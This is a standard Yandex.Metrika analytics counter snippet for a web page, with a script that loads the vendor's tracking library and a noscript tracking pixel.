<!-- Yandex.Metrika counter -->
<script type="text/javascript">
    (function (d, w, c) {
        (w[c] = w[c] || []).push(function() {
            try {
                w.yaCounter45113736 = new Ya.Metrika({
                    id:45113736,
                    clickmap:true,
                    trackLinks:true,
                    accurateTrackBounce:true,
                    webvisor:true
                });
            } catch(e) { }
        });

        var n = d.getElementsByTagName("script")[0],
            s = d.createElement("script"),
            f = function () { n.parentNode.insertBefore(s, n); };
        s.type = "text/javascript";
        s.async = true;
        s.src = "https://mc.yandex.ru/metrika/watch.js";

        if (w.opera == "[object Opera]") {
            d.addEventListener("DOMContentLoaded", f, false);
        } else { f(); }
    })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/45113736" style="position:absolute; 
left:-9999px;" alt="" /></div></noscript>
<!-- /Yandex.Metrika counter -->
